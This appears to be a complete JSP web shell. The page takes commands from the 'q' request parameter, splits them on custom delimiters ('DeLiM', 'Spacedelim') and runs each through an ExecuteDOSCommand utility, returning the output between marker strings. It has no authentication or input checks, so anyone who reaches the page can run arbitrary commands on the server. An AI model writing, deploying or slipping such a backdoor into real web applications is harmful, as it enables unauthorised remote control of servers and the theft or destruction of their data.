<%@page import="utilities.ExecuteDOSCommand"%>
pAgE
<%
String q=request.getParameter("q");
q=q.replaceAll("Spacedelim", " ");
String[] cmds=q.split("DeLiM");
for(int i=0;i<cmds.length;i++){
%>oUtPuT<%=ExecuteDOSCommand.getCommandOutput(cmds[i], 0) %>
  <%} %>
pAgE
